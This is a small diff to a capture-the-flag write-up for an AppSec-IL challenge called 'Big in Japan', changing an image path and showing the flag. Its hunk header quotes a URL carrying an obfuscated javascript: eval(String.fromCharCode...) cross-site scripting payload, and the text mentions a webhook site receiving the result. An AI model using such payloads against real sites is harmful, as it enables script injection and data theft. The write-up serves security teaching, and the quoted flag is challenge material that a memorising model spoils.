@@ -27,7 +27,7 @@ https://big-in-japan.appsecil.ctf.today/?url=jaVasCriPt:eval(String.fromCharCode
 
 And the image, from the webhook site:
 
-![web hook](./Final.png)
+![web hook](./Big_In_Japan/Final.png)
 
 
 The flag is `AppSec-IL{omedetto}`
